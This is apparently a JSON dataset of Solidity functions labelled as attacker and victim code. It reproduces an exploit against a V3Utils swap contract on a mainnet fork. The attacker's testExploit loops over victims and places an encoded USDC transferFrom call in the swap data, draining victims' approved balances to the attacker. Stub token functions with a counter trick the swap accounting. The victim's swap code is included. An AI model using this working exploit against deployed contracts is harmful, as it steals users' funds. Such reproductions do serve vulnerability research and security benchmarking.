[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 value) external returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address owner\n    ) external view returns (uint256) {\n        if (counter == 1) return 1;\n        else return 0;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_653_389);\n        cheats.label(address(utils), \"utils\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        for (uint256 i; i < victims.length; ++i) {\n            uint256 transferAmount = USDC.balanceOf(victims[i]);\n            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {\n                transferAmount = USDC.allowance(victims[i], address(utils));\n                if (transferAmount == 0) continue;\n            }\n            bytes memory data = abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", victims[i], address(this), transferAmount\n            );\n            bytes memory swapdata = abi.encode(address(USDC), address(this), data);\n            V3Utils.SwapParams memory params = V3Utils.SwapParams({\n                tokenIn: address(this),\n                tokenOut: address(this),\n                amountIn: 1,\n                minAmountOut: 0,\n                recipient: address(this),\n                swapData: swapdata,\n                unwrap: false\n            });\n            utils.swap(params);\n            counter--;\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 value) external returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint256 value) external returns (bool) {\n        counter++;\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "V3Utils",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(SwapParams calldata params) external payable returns (uint256 amountOut) {\n\n        _prepareAdd(params.tokenIn, IERC20(address(0)), IERC20(address(0)), params.amountIn, 0, 0);\n\n        uint amountInDelta;\n        (amountInDelta, amountOut) = _swap(params.tokenIn, params.tokenOut, params.amountIn, params.minAmountOut, params.swapData);\n\n        // send swapped amount of tokenOut\n        if (amountOut > 0) {\n            _transferToken(params.recipient, params.tokenOut, amountOut, params.unwrap);\n        }\n\n        // if not all was swapped - return leftovers of tokenIn\n        uint leftOver = params.amountIn - amountInDelta;\n        if (leftOver > 0) {\n            _transferToken(params.recipient, params.tokenIn, leftOver, params.unwrap);\n        }\n    }\n\n    /// @notice Params for swapAndMint() function\n    struct SwapAndMintParams {\n        IERC20 token0;\n        IERC20 token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n\n        // how much is provided of token0 and token1\n        uint256 amount0;\n        uint256 amount1;\n        address recipient; // recipient of leftover tokens\n        address recipientNFT; // recipient of nft\n        uint256 deadline;\n\n        // source token for swaps (maybe either address(0), token0, token1 or another token)\n        // if swapSourceToken is another token than token0 or token1 -> amountIn0 + amountIn1 of swapSourceToken are expected to be available\n        IERC20 swapSourceToken;\n\n        // if swapSourceToken needs to be swapped to token0 - set values\n        uint amountIn0;\n        uint amountOut0Min;\n        bytes swapData0;\n\n        // if swapSourceToken needs to be swapped to token1 - set values\n        uint amountIn1;\n        uint amountOut1Min;\n        bytes swapData1;\n\n        // min amount to be added after swap\n        uint amountAddMin0;\n        uint amountAddMin1;\n\n        // data to be sent along newly created NFT when transfered to recipient (sent to IERC721Receiver callback)\n        bytes returnData;\n    }\n\n    /// @notice Does 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to a newly minted position.\n    /// @param params Swap and mint configuration\n    /// Newly minted NFT and leftover tokens are returned to recipient\n    function swapAndMint(SwapAndMintParams calldata params) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) {\n        if (params.token0 == params.token1) {\n            revert SameToken();\n        }\n        _prepareAdd(params.token0, params.token1, params.swapSourceToken, params.amount0, params.amount1, params.amountIn0 + params.amountIn1);\n        (tokenId, liquidity, amount0, amount1) = _swapAndMint(params, msg.value > 0);\n    }\n\n    /// @notice Params for swapAndIncreaseLiquidity() function\n    struct SwapAndIncreaseLiquidityParams {\n        uint256 tokenId;\n\n        // how much is provided of token0 and token1\n        uint256 amount0;\n        uint256 amount1;\n        address recipient; // recipient of leftover tokens\n        uint256 deadline;\n        \n        // source token for swaps (maybe either address(0), token0, token1 or another token)\n        // if swapSourceToken is another token than token0 or token1 -> amountIn0 + amountIn1 of swapSourceToken are expected to be available\n        IERC20 swapSourceToken;\n\n        // if swapSourceToken needs to be swapped to token0 - set values\n        uint amountIn0;\n        uint amountOut0Min;\n        bytes swapData0;\n\n        // if swapSourceToken needs to be swapped to token1 - set values\n        uint amountIn1;\n        uint amountOut1Min;\n        bytes swapData1;\n\n        // min amount to be added after swap\n        uint amountAddMin0;\n        uint amountAddMin1;\n    }\n\n    /// @notice Does 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to any existing position (no need to be position owner).\n    /// @param params Swap and increase liquidity configuration\n    // Sends any leftover tokens to recipient.\n    function swapAndIncreaseLiquidity(SwapAndIncreaseLiquidityParams calldata params) external payable returns (uint128 liquidity, uint256 amount0, uint256 amount1) {\n        (, , address token0, address token1, , , , , , , , ) = nonfungiblePositionManager.positions(params.tokenId);\n        _prepareAdd(IERC20(token0), IERC20(token1), params.swapSourceToken, params.amount0, params.amount1, params.amountIn0 + params.amountIn1);\n        (liquidity, amount0, amount1) = _swapAndIncrease(params, IERC20(token0), IERC20(token1), msg.value > 0);\n    }\n\n    // checks if required amounts are provided and are exact - wraps any provided ETH as WETH\n    // if less or more provided reverts\n",
    "description": ""
  }
]